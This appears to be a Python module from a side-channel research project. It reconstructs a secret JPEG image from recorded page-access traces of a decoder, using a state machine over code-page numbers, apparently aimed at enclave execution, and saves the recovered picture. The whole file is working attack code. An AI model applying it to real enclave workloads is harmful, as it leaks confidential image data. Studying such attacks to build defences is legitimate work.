from __future__ import annotations

import json
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path


from .model import TraceData
from .parser import load_vcd_trace


class JpegState(Enum):
    PRE_START = "pre_start"
    START = "start"
    NEXT_ROW = "next_row"
    START_ROW = "start_row"
    PRE_IDCT_SLOW = "pre_idct_slow"
    IDCT_SLOW = "idct_slow"
    DATA_COUNT = "data_count"


@dataclass(frozen=True)
class JpegAttackConfig:
    start_range: range = field(default_factory=lambda: range(54, 55))
    next_row_range: range = field(default_factory=lambda: range(44, 46))
    start_row_range: range = field(default_factory=lambda: range(58, 59))
    pre_idct_slow_range: range = field(default_factory=lambda: range(59, 60))
    idct_slow_range: range = field(default_factory=lambda: range(63, 65))
    data_count_range_no_aexnotify: range = field(default_factory=lambda: range(150, 4340))
    data_count_range_aexnotify: range = field(default_factory=lambda: range(150, 4335))
    data_count_pages: frozenset[int] | None = None
    num_colors: int = 1
    aexnotify: bool = False

    def data_count_range(self) -> range:
        return self.data_count_range_aexnotify if self.aexnotify else self.data_count_range_no_aexnotify

    def pages_for_state(self, state: JpegState) -> range:
        if state == JpegState.START:
            return self.start_range
        if state == JpegState.NEXT_ROW:
            return self.next_row_range
        if state == JpegState.START_ROW:
            return self.start_row_range
        if state == JpegState.PRE_IDCT_SLOW:
            return self.pre_idct_slow_range
        if state == JpegState.IDCT_SLOW:
            return self.idct_slow_range
        if state == JpegState.DATA_COUNT:
            return self.data_count_range()
        return range(0, 0)

    def page_matches_state(self, state: JpegState, page_number: int) -> bool:
        if state == JpegState.DATA_COUNT and self.data_count_pages is not None:
            return page_number in self.data_count_pages
        return page_number in self.pages_for_state(state)

    def next_states(self, state: JpegState) -> list[JpegState]:
        if state == JpegState.PRE_START:
            return [JpegState.START]
        if state == JpegState.START:
            return [JpegState.START_ROW]
        if state == JpegState.NEXT_ROW:
            return [JpegState.START_ROW]
        if state == JpegState.START_ROW:
            return [JpegState.IDCT_SLOW]
        if state == JpegState.PRE_IDCT_SLOW:
            return [JpegState.IDCT_SLOW, JpegState.NEXT_ROW]
        if state == JpegState.IDCT_SLOW:
            return [JpegState.DATA_COUNT]
        if state == JpegState.DATA_COUNT:
            return [JpegState.DATA_COUNT, JpegState.PRE_IDCT_SLOW, JpegState.NEXT_ROW]
        return []

    def next_state(self, current: JpegState, page_number: int) -> JpegState:
        for candidate in self.next_states(current):
            if self.page_matches_state(candidate, page_number):
                return candidate
        return current


@dataclass
class JpegReconstruction:
    num_colors: int = 1
    rows: list[list[list[int]]] = field(init=False)
    current_color: int = 0
    current_row: int = 0
    min_data: int = field(default=int(1e18))
    max_data: int = 0

    def __post_init__(self) -> None:
        self.rows = [[[]] for _ in range(self.num_colors)]

    def next_row(self) -> None:
        for color in range(self.num_colors):
            self.rows[color].append([])
        self.current_row += 1

    def reconstruct_block(self, num_data: int) -> None:
        self.min_data = min(self.min_data, num_data)
        self.max_data = max(self.max_data, num_data)
        self.rows[self.current_color][self.current_row].append(num_data)
        self.current_color = (self.current_color + 1) % self.num_colors

    def reconstruct_transition(
        self,
        prev_state: JpegState,
        new_state: JpegState,
        data_counter: int,
    ) -> None:
        if prev_state == JpegState.DATA_COUNT and new_state != JpegState.DATA_COUNT:
            self.reconstruct_block(data_counter)

        if prev_state == JpegState.NEXT_ROW and new_state == JpegState.START_ROW:
            self.next_row()

    def reconstructed_size(self) -> tuple[int, int]:
        width = 0
        for row in self.rows[0]:
            width = max(width, len(row))
        height = len(self.rows[0])
        return width, height

    def raw_reconstruction(self) -> list[list[list[int]]]:
        return self.rows

    def _flatten_plane_values(self, color: int = 0) -> list[int]:
        values: list[int] = []
        for row in self.rows[color]:
            values.extend(row)
        return values

    def _normalization_bounds(
        self,
        color: int = 0,
        low_percentile: float = 0.0,
        high_percentile: float = 100.0,
    ) -> tuple[int, int]:
        values = self._flatten_plane_values(color)
        if not values:
            return 0, 1

        values.sort()

        if low_percentile <= 0.0 and high_percentile >= 100.0:
            lo = values[0]
            hi = values[-1]
            if hi <= lo:
                hi = lo + 1
            return lo, hi

        n = len(values)
        low_idx = int((low_percentile / 100.0) * (n - 1))
        high_idx = int((high_percentile / 100.0) * (n - 1))

        low_idx = max(0, min(low_idx, n - 1))
        high_idx = max(0, min(high_idx, n - 1))

        lo = values[low_idx]
        hi = values[high_idx]
        if hi <= lo:
            hi = lo + 1
        return lo, hi

    def normalized_plane(
        self,
        color: int = 0,
        low_percentile: float = 0.0,
        high_percentile: float = 100.0,
    ) -> list[list[int]]:
        width, height = self.reconstructed_size()
        if height == 0:
            return []

        min_val, max_val = self._normalization_bounds(
            color=color,
            low_percentile=low_percentile,
            high_percentile=high_percentile,
        )

        scale = 255.0 / (max_val - min_val)

        out: list[list[int]] = []
        for y in range(height):
            src_row = self.rows[color][y] if y < len(self.rows[color]) else []
            dst_row: list[int] = []
            for x in range(width):
                value = src_row[x] if x < len(src_row) else min_val
                clipped = min(max(value, min_val), max_val)
                normalized = int((clipped - min_val) * scale)
                if normalized < 0:
                    normalized = 0
                if normalized > 255:
                    normalized = 255
                dst_row.append(normalized)
            out.append(dst_row)
        return out

    def normalized_rgb(
        self,
        low_percentile: float = 0.0,
        high_percentile: float = 100.0,
    ) -> list[list[tuple[int, int, int]]]:
        width, height = self.reconstructed_size()
        if self.num_colors == 1:
            gray = self.normalized_plane(
                0,
                low_percentile=low_percentile,
                high_percentile=high_percentile,
            )
            return [[(v, v, v) for v in row] for row in gray]

        planes = [
            self.normalized_plane(
                i,
                low_percentile=low_percentile,
                high_percentile=high_percentile,
            )
            for i in range(self.num_colors)
        ]
        out: list[list[tuple[int, int, int]]] = []
        for y in range(height):
            row: list[tuple[int, int, int]] = []
            for x in range(width):
                r = planes[0][y][x] if x < len(planes[0][y]) else 0
                g = planes[1][y][x] if self.num_colors > 1 and x < len(planes[1][y]) else 0
                b = planes[2][y][x] if self.num_colors > 2 and x < len(planes[2][y]) else 0
                row.append((r, g, b))
            out.append(row)
        return out

    def save_raw_json(self, path: str | Path) -> None:
        Path(path).write_text(json.dumps(self.rows, indent=2), encoding="utf-8")

    def save_pgm(
        self,
        path: str | Path,
        color: int = 0,
        low_percentile: float = 0.0,
        high_percentile: float = 100.0,
    ) -> None:
        plane = self.normalized_plane(
            color=color,
            low_percentile=low_percentile,
            high_percentile=high_percentile,
        )
        height = len(plane)
        width = len(plane[0]) if height else 0

        with open(path, "wb") as f:
            f.write(f"P5\n{width} {height}\n255\n".encode("ascii"))
            for row in plane:
                f.write(bytes(row))

    def save_ppm(
        self,
        path: str | Path,
        low_percentile: float = 0.0,
        high_percentile: float = 100.0,
    ) -> None:
        rgb = self.normalized_rgb(
            low_percentile=low_percentile,
            high_percentile=high_percentile,
        )
        height = len(rgb)
        width = len(rgb[0]) if height else 0

        with open(path, "wb") as f:
            f.write(f"P6\n{width} {height}\n255\n".encode("ascii"))
            for row in rgb:
                for r, g, b in row:
                    f.write(bytes((r, g, b)))

    def save_png_preview(
        self,
        path: str | Path,
        scale: int = 16,
        block_size: int = 1,
        low_percentile: float = 2.0,
        high_percentile: float = 98.0,
    ) -> None:
        try:
            from PIL import Image
        except ImportError as exc:
            raise RuntimeError(
                "Pillow is niet geïnstalleerd. Doe eerst: pip install pillow"
            ) from exc

        block_size = max(1, int(block_size))
        scale = max(1, int(scale))

        if self.num_colors == 1:
            plane = self.normalized_plane(
                0,
                low_percentile=low_percentile,
                high_percentile=high_percentile,
            )
            height = len(plane)
            width = len(plane[0]) if height else 0

            img = Image.new("L", (max(1, width * block_size), max(1, height * block_size)))
            for y, row in enumerate(plane):
                for x, value in enumerate(row):
                    base_x = x * block_size
                    base_y = y * block_size
                    for dy in range(block_size):
                        for dx in range(block_size):
                            img.putpixel((base_x + dx, base_y + dy), value)
        else:
            rgb = self.normalized_rgb(
                low_percentile=low_percentile,
                high_percentile=high_percentile,
            )
            height = len(rgb)
            width = len(rgb[0]) if height else 0

            img = Image.new("RGB", (max(1, width * block_size), max(1, height * block_size)))
            for y, row in enumerate(rgb):
                for x, value in enumerate(row):
                    base_x = x * block_size
                    base_y = y * block_size
                    for dy in range(block_size):
                        for dx in range(block_size):
                            img.putpixel((base_x + dx, base_y + dy), value)

        if scale > 1 and img.size[0] > 0 and img.size[1] > 0:
            img = img.resize((img.size[0] * scale, img.size[1] * scale), Image.NEAREST)

        img.save(path)

    def to_debug_dict(self) -> dict:
        width, height = self.reconstructed_size()
        return {
            "width_blocks": width,
            "height_blocks": height,
            "num_colors": self.num_colors,
            "min_data": None if self.min_data == int(1e18) else self.min_data,
            "max_data": self.max_data,
            "rows": self.rows,
        }


@dataclass
class JpegAttackResult:
    config: JpegAttackConfig
    reconstruction: JpegReconstruction
    final_state: JpegState
    processed_pages: int

    @property
    def width(self) -> int:
        return self.reconstruction.reconstructed_size()[0]

    @property
    def height(self) -> int:
        return self.reconstruction.reconstructed_size()[1]

    def save_image(self, path: str | Path) -> None:
        suffix = Path(path).suffix.lower()
        if suffix == ".png":
            self.reconstruction.save_png_preview(
                path,
                scale=1,
                block_size=8,
                low_percentile=2.0,
                high_percentile=98.0,
            )
        elif self.config.num_colors == 1:
            self.reconstruction.save_pgm(path)
        else:
            self.reconstruction.save_ppm(path)

    def save_raw_json(self, path: str | Path) -> None:
        self.reconstruction.save_raw_json(path)

    def save_preview(self, path: str | Path, scale: int = 16) -> None:
        self.reconstruction.save_png_preview(
            path,
            scale=scale,
            block_size=8,
            low_percentile=2.0,
            high_percentile=98.0,
        )


def _page_name_to_number(page_name: str) -> int:
    if page_name.startswith("_"):
        return int(page_name[1:])
    return int(page_name)


def _iter_v1_page_events(trace: TraceData):
    for _, changes in zip(trace.times, trace.events):
        for signal_name, value in changes.items():
            if value != "1":
                continue
            try:
                page_number = _page_name_to_number(signal_name)
            except ValueError:
                continue
            yield signal_name, page_number


def attack_jpeg_trace(
    trace: TraceData,
    config: JpegAttackConfig | None = None,
) -> JpegAttackResult:
    if config is None:
        config = JpegAttackConfig()

    # Pre-compute the set of pages that can drive a state transition.
    # Pages outside this set never affect the state machine, so we skip them
    # for efficiency and to align with the navigator-driven attack which
    # filters via breakpoints on these same pages.
    interesting_pages: set[int] = set()
    for s in JpegState:
        interesting_pages.update(config.pages_for_state(s))
    if config.data_count_pages:
        interesting_pages.update(config.data_count_pages)

    state = JpegState.PRE_START
    reconstruction = JpegReconstruction(num_colors=config.num_colors)
    data_counter = 0
    processed_pages = 0

    for _, page_number in _iter_v1_page_events(trace):
        if page_number not in interesting_pages:
            continue
        prev_state = state
        new_state = config.next_state(state, page_number)

        if prev_state == JpegState.IDCT_SLOW and new_state == JpegState.DATA_COUNT:
            data_counter = 1
        elif (
            prev_state == JpegState.DATA_COUNT
            and new_state == JpegState.DATA_COUNT
            and config.page_matches_state(JpegState.DATA_COUNT, page_number)
        ):
            # Only increment when the page actually matched the DATA_COUNT
            # range. Without this guard, a page that is in *no* state's range
            # leaves new_state == prev_state == DATA_COUNT and would falsely
            # increment, over-counting blocks (the bug observed in v1, see
            # EVALUATION.md §13).
            data_counter += 1

        reconstruction.reconstruct_transition(prev_state, new_state, data_counter)

        if prev_state == JpegState.DATA_COUNT and new_state != JpegState.DATA_COUNT:
            data_counter = 0

        state = new_state
        processed_pages += 1

    if state == JpegState.DATA_COUNT and data_counter > 0:
        reconstruction.reconstruct_block(data_counter)

    return JpegAttackResult(
        config=config,
        reconstruction=reconstruction,
        final_state=state,
        processed_pages=processed_pages,
    )


def attack_jpeg_vcd(
    trace_path: str | Path,
    config: JpegAttackConfig | None = None,
) -> JpegAttackResult:
    trace = load_vcd_trace(str(trace_path))
    return attack_jpeg_trace(trace, config)


def save_attack_outputs(
    result: JpegAttackResult,
    image_path: str | Path | None = None,
    raw_json_path: str | Path | None = None,
    preview_path: str | Path | None = None,
    preview_scale: int = 16,
) -> None:
    if image_path is not None:
        result.save_image(image_path)
    if raw_json_path is not None:
        result.save_raw_json(raw_json_path)
    if preview_path is not None:
        result.save_preview(preview_path, scale=preview_scale)